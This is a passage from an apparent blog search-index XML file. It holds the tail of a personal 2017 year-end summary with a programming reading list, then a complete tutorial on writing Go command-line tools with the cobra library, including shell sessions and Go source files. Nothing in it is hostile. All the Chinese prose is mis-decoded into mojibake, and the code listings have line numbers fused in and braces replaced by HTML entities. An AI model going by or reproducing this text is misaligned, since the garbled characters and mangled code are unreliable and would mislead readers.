å…¶å®žç”Ÿæ´»ä¸Šä¹Ÿæœ‰å¾ˆå¤šå€¼å¾—é«˜å…´çš„äº‹å„¿ï¼Œæˆ‘ä»¬æœ‰äº†è‡ªå·±çš„æˆ¿å­ï¼Œå¹¶ä¸”æ¬è¿›åŽ»äº†ï¼Œå‘Šåˆ«äº†ç§Ÿæˆ¿çš„æ—¥å­ï¼Œè¿™ä¸€åˆ‡å¤šè°¢æˆ‘çš„è€å©†æ‰“ç†ï¼Œæˆ‘åŸºæœ¬æ˜¯å•¥å¿ƒéƒ½æ²¡æ“è¿‡ã€‚å…¶æ¬¡ï¼Œæˆ‘å¥³å„¿å’Œæˆ‘å…³ç³»ä¹Ÿå¾ˆä¸é”™ï¼Œè™½ç„¶å¥¹ç”Ÿæ°”çš„æ—¶å€™åªæ‰¾å¥¹å¦ˆå¦ˆï¼Œä½†æ˜¯æˆ‘åœ¨å¥¹å¿ƒä¸­çš„åœ°ä½ä¹Ÿä»…æ¬¡äºŽå¥¹å¦ˆå¦ˆï¼Œæˆ‘ä¹Ÿå¿ƒæœ‰æ„§ç–šï¼Œä½œä¸ºä¸€ä¸ªçˆ¶äº²æˆ‘é™ªä¼´å¥¹çš„æ—¶å€™æ˜¯æœ‰ç‚¹å°‘äº†ã€‚è¿˜æœ‰æˆ‘çš„å¥½æ­æ¡£ï¼Œåœ¨æˆ‘æœ€éœ€è¦é’±çš„æ—¶å€™, ä¸€èº«ä¸å­çš„ç›´æŽ¥è½¬æˆ‘æ”¯ä»˜å®ä¸Š,äººç”Ÿä¸­èƒ½äº¤åˆ°ä¸€ä¸ªè¿™æ ·çš„æœ‹å‹ï¼Œæ˜¯æˆ‘çš„èŽ«å¤§çš„è£å¹¸ã€‚ è¿˜æœ‰ä¸€ä¸ªäº‹å„¿ï¼Œæˆ‘ç»ˆäºŽç”¨ä¸ŠMacäº†ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªäºŒæ‰‹çš„MBPï¼Œä½†æ˜¯è¿™å¯¹æ»¡è¶³ä¸€ä¸ªå±Œä¸çš„è™šè£å¿ƒå®Œå…¨å—ç”¨äº†, è¯´å²”äº†, æˆ‘å†ä¹Ÿä¸ç”¨åœ¨Windowsä¸Šè£…Ubuntuå¼€å‘äº†ã€‚ çž¬æ¯ä¸‡å˜çš„2017å˜åŒ–å’Œé©æ–°æ˜¯å¾ˆå¿«çš„, æ¯”å¦‚OpenStackæ²¡æœ‰é‚£ä¹ˆçƒ­äº†, å®¹å™¨æŠ€æœ¯ä¹ŸåŸºæœ¬æˆäº†å¼€å‘çš„å¿…å¤‡æŠ€èƒ½, æ— è®ºä½ ä½œä¸ºä¸€ä¸ªå‰ç«¯å¼€å‘è¿˜æ˜¯åŽç«¯å¼€å‘JavaScriptéƒ½å¿«æˆä¸ºä¸€é—¨å¿…å¤‡è¯­è¨€äº†ã€‚å‰åŽç«¯çš„å®Œå…¨åˆ†ç¦»ä¹Ÿæ„ˆæ¼”æ„ˆçƒˆ, å„ç§å‰æ®µæ¡†æž¶çš„å˜åŒ–ã€‚ä¼´éšè€Œæ¥çš„æ˜¯å¾®æœåŠ¡+å®¹å™¨æŠ€æœ¯çš„ç´§å¯†ç»“åˆã€‚åœ¨æœ€åŽDDDä¹Ÿéšç€å¾®æœåŠ¡çš„å‡ºçŽ°ï¼Œå¯¹å¼€å‘äººå‘˜æå‡ºäº†æ›´é«˜çš„éœ€æ±‚, ä»¥åŽé‚£ç§åªä¼šå†™ä»£ç çš„äººå°†æ„ˆæ¥æ„ˆå°‘äº†ã€‚ æˆ‘Holdä¸ä½è¿™äº›ï¼Œå› æ­¤åœ¨æŠ€æœ¯æ–¹é¢æˆ‘ä»…èƒ½åˆ—å‡ºæˆ‘éœ€è¦æå‡çš„ä¹¦å•: Pythonæå‡ä¹¦å•(ä»Šå¹´ä¸»åŠ›) åŸºç¡€å›žè¿‡ å»–é›ªå³°å®˜ç½‘ Think Python 2ed ä¸­è¯‘ç‰ˆç²¾æ ¡ PDF ç”µå­ä¹¦ è¿›é˜¶æ·± python3-cookbook ç”µå­ä¹¦Pythoné«˜æ‰‹ä¹‹è·¯ å¸¸è§çš„ä¸€äº›ä»£ç å®žçŽ° pythonå®žä¾‹æ‰‹å†Œ ç½‘ç«™ä¸Šçš„æ–‡ç«  è®¾è®¡æ¨¡å¼ å¿«é€Ÿç‰ˆå¤§è¯è®¾è®¡æ¨¡å¼ ä¸€äº›æœ€æ–°çš„ä¾‹å­ ç²¾é€šPythonè®¾è®¡æ¨¡å¼ æ•°æ®ç»“æž„ä¸Žç®—æ³• å¿«é€Ÿé˜…è¯»æ€»ç»“ ç”µå­ä¹¦ï¼šData Structures and Algorithms with Python-2015 æºç é˜…è¯» Django Class Based View Flask æºç é˜…è¯» Openstack KeyStone æºç é˜…è¯» ç†è§£Pythonè§£é‡Šå™¨ ç”¨Pythonå®žçŽ°ä¸€ä¸ªPythonè§£é‡Šå™¨ Golangæå‡ä¹¦å• å›žè¿‡åŸºç¡€ï¼š Go Web ç¼–ç¨‹ Goå…¥é—¨æŒ‡å— JavaScriptæå‡ä¹¦å• å›žè¿‡åŸºç¡€ï¼š å»–é›ªå³°å®˜ç½‘ é˜®ä¸€å³°çš„javascriptæ•™ç¨‹ ECMAScript 6 å…¥é—¨ é™¤äº†æŠ€æœ¯, è¿˜åº”è¯¥æœ‰ç”Ÿæ´»ã€‚è€Œç”Ÿæ´»å°±æ˜¯: èµ¶ç´§æŠŠè´¦è¿˜å®Œ]]></content>
      <categories>
        <category>æ‚è°ˆ</category>
        <category>å¹´ç»ˆæ€»ç»“</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨golangç¼–å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·]]></title>
    <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
    <content type="text"><![CDATA[æ— è®ºæ˜¯Openstackè¿˜æ˜¯Dockeréƒ½æœ‰ä¸€ä¸ªæ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·ï¼ŒOpenstackçš„å‘½ä»¤è¡Œå·¥å…·ä¸»è¦ä½¿ç”¨çš„æ˜¯Pythonçš„argparseåº“ï¼Œè‡³äºŽDockerçš„CLIçš„å®žçŽ°è¿˜æ²¡çœ‹ï¼Œä½†æ˜¯ä»Šå¤©çœ‹åˆ°äº†ä¸€ä¸ªåœ¨Golangä¸­ ç”¨äºŽæž„å»ºåƒDockerå‘½ä»¤è¡Œé£Žæ ¼çš„ä¸€ä¸ªåº“:cobra cobraç®€ä»‹Cobraæ—¢æ˜¯ä¸€ä¸ªç”¨æ¥åˆ›å»ºå¼ºå¤§çš„çŽ°ä»£CLIå‘½ä»¤è¡Œçš„golangåº“ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç”Ÿæˆç¨‹åºåº”ç”¨å’Œå‘½ä»¤è¡Œæ–‡ä»¶çš„ç¨‹åºã€‚å®ƒæä¾›çš„åŠŸèƒ½æœ‰ï¼š ç®€æ˜“çš„å­å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå¦‚ app serverï¼Œ app fetchç­‰ç­‰ å®Œå…¨å…¼å®¹posixå‘½ä»¤è¡Œæ¨¡å¼ åµŒå¥—å­å‘½ä»¤subcommand æ”¯æŒå…¨å±€ï¼Œå±€éƒ¨ï¼Œä¸²è”flags ä½¿ç”¨Cobraå¾ˆå®¹æ˜“çš„ç”Ÿæˆåº”ç”¨ç¨‹åºå’Œå‘½ä»¤ï¼Œä½¿ç”¨cobra create appnameå’Œcobra add cmdname å¦‚æžœå‘½ä»¤è¾“å…¥é”™è¯¯ï¼Œå°†æä¾›æ™ºèƒ½å»ºè®®ï¼Œå¦‚ app srverï¼Œå°†æç¤ºsrveræ²¡æœ‰ï¼Œæ˜¯å¦æ˜¯app server è‡ªåŠ¨ç”Ÿæˆcommandså’Œflagsçš„å¸®åŠ©ä¿¡æ¯ è‡ªåŠ¨ç”Ÿæˆè¯¦ç»†çš„helpä¿¡æ¯ï¼Œå¦‚app help è‡ªåŠ¨è¯†åˆ«-hï¼Œâ€“helpå¸®åŠ©flag è‡ªåŠ¨ç”Ÿæˆåº”ç”¨ç¨‹åºåœ¨bashä¸‹å‘½ä»¤è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ è‡ªåŠ¨ç”Ÿæˆåº”ç”¨ç¨‹åºçš„manæ‰‹å†Œ å‘½ä»¤è¡Œåˆ«å è‡ªå®šä¹‰helpå’Œusageä¿¡æ¯ å¯é€‰çš„ç´§å¯†é›†æˆçš„viper apps ä»ŽåŠŸèƒ½ä¸Šçœ‹å®Œå…¨è¶…è¶Šäº†argparseï¼Œ ä¸‹é¢å°†åšä¸€ä¸ªç®€å•çš„æµ‹è¯•ï¼Œä½“éªŒä¸‹cobraçš„å¼ºå¤§ å®‰è£…å®‰è£…cobraéœ€è¦ç¿»å¢™ï¼Œæˆ‘çš„çŽ¯å¢ƒæ˜¯Macï¼Œä½¿ç”¨ss + polipoæ¥æä¾›httpsçš„æ–¹å‘ä»£ç†ã€‚æˆ‘çš„ä»£ç†ç«¯å£åœ¨8123,æ‰€ä»¥å‘½ä»¤è¡Œæ˜¯è¿™æ ·çš„1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra å®‰è£…å®ŒæˆåŽå¯ä»¥çœ‹åˆ°cobraçš„ä¸€äº›å¸®åŠ©ä¿¡æ¯1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. ä½¿ç”¨æŽ¥ä¸‹æ¥å°†ä½¿ç”¨cobraæž„å»ºä¸€ä¸ªä¸å¸¦å­å‘½ä»¤çš„CLIå’Œå¸¦å­å‘½ä»¤çš„CLI åˆå§‹åŒ–æˆ‘ä»¬å¯ä»¥é€šè¿‡cobraæä¾›çš„initå‘½ä»¤æ¥ç”ŸæˆCLIçš„æ¡†æž¶ä»£ç ï¼Œå› æ­¤åˆ‡æ¢åˆ°GOPATH/srcä¸‹é¢,åˆå§‹CLIæ¡†æž¶12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` è¿™ä¸ªå‘½ä»¤ä¼šå¸®ä½ ç”Ÿæˆè¿™æ ·ä¸€ä¸ªæ¡†æž¶ä»£ç 123456 maojun@maojun-mbp$ tree demodemoâ”œâ”€â”€ LICENSEâ”œâ”€â”€ cmdâ”‚ â””â”€â”€ root.goâ””â”€â”€ main.go ç®€å•çš„CLIåœ¨å†™ä¸€äº›ç®€å•çš„CLIçš„æ—¶å€™æˆ‘ä»¬å…¶å®žæ˜¯ä¸éœ€è¦æœ‰å­å‘½ä»¤çš„ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦è¿™æ ·ä¸€ç§ç®€å•çš„CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name æŽ¥ä¸‹æ¥æˆ‘ä»¬å°±åœ¨ä¸Šé¢ç”Ÿæˆçš„ä»£ç çš„åŸºç¡€ä¸Šå®Œæˆä¸€ä¸ªä¸å¸¦å­å‘½ä»¤çš„CLIã€‚é¦–å…ˆï¼Œæˆ‘éœ€è¦ç¼–å†™æˆ‘çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤æˆ‘åœ¨demoä¸‹é¢æ–°å»ºä¸€ä¸ªåŒ…ï¼Œåç§°ä¸ºsimpleã€‚å¦‚ä¸‹ï¼š123456789maojun@maojun-mbp$ tree ..â”œâ”€â”€ LICENSEâ”œâ”€â”€ cmdâ”‚ â””â”€â”€ root.goâ”œâ”€â”€ main.goâ””â”€â”€ simple â”œâ”€â”€ simple.go â””â”€â”€ simple_test.go è¿™é‡Œä»…ä»…å®žçŽ°ä¸€ä¸ªprintä½œä¸ºæ ·ä¾‹,å› æ­¤simple.goæ˜¯è¿™æ ·å®žçŽ°çš„123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; æŽ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬å®žè¡Œçš„æ•´ä¸ªShowæ–¹æ³•æš´éœ²ç»™CLI, æˆ‘ä»¬ä»Žç”Ÿæˆçš„mainæ–‡ä»¶å…¥æ‰‹åˆ†æžã€‚ åœ¨mainé‡Œé¢è°ƒç”¨äº† demo/cmdåŒ…é‡Œé¢æš´éœ²çš„Execute å‡½æ•° [cmd.Execute()] åœ¨demo/cmd/root.goä¸­å‘çŽ°Executeæ‰§è¡Œçš„æ˜¯RootCmd.Execute() è€ŒRootCmdæ˜¯ä¸€ä¸ªcobraçš„Commandç»“æž„ä½“[RootCmd = &amp;cobra.Command]æ˜¾ç„¶æˆ‘ä»¬æƒ³è¦å®žè¡Œä¸å¸¦å­å‘½ä»¤çš„CLIï¼Œåªéœ€è¦å°†RootCmdçš„ä¿®æ”¹æˆæˆ‘ä»¬éœ€è¦çš„ç»“æž„ä½“å°±okäº† è¿™é‡Œåšäº†å‡ ç‚¹ä¿®æ”¹ RootCmdä¸­çš„Commandç»“æž„ä½“ä¸­çš„Runæ–¹æ³•éœ€è¦æˆ‘ä»¬å®šä¹‰ï¼Œ ä¸»è¦åŠŸèƒ½å°±æ˜¯è°ƒç”¨simpleé‡Œé¢çš„ShowæŽ¥å£ cmdåŒ…åˆå§‹åŒ–å¾—æ—¶å€™éœ€è¦é€šè¿‡RootCmd.Flags()èŽ·å–å‘½ä»¤è¡Œä¼ å…¥çš„nameå’Œageçš„å‚æ•°ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä¿®æ”¹initæ–¹æ³• æœ€åŽæˆ‘ä»¬ä¸éœ€è¦ä»Žé…ç½®æ–‡ä»¶è¯»å–é…ç½®ï¼Œæ³¨é‡ŠæŽ‰ï¼šnitConfigå‡½æ•°å’Œâ€github.com/spf13/viperâ€ æœ€ç»ˆè¿™ä¸ªroot.goæ˜¯è¿™æ ·çš„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright Â© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; æœ€åŽæµ‹è¯•ä¸‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæžœ1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 å¸¦å­å‘½ä»¤çš„CLIå¯¹äºŽå¤æ‚çš„æƒ…å†µï¼Œå¾€å¾€éœ€è¦å¸¦å­å‘½ä»¤åœºæ™¯ï¼Œæ¯”å¦‚Dockerçš„CLIï¼Œè€Œæœ€ç»ˆçš„æ•ˆæžœåº”è¯¥æ˜¯è¿™æ ·çš„12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. æ”¯æŒå­å‘½ä»¤æ˜¯cobraçš„è‡ªå·±çš„åŠŸèƒ½ï¼Œå› æ­¤ç›´æŽ¥å¯ä»¥é€šè¿‡cobraç”Ÿæˆå¸¦å­å‘½ä»¤çš„ä»£ç 12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go æ³¨é‡ŠæŽ‰root.goé‚£äº›ä¸éœ€è¦çš„åœ°æ–¹, ç„¶åŽä¿®æ”¹ç”Ÿæˆçš„test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright Â© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; æœ€åŽæµ‹è¯•ä¸‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæžœ 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 å‘½ä»¤è¡Œè¡¥å…¨ï¼Œmanè¿™äº›å¯ä»¥è‡ªå·±æ‰‹åŠ¨æµ‹è¯•]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cobra</tag>
      </tags>
  </entry>
</search>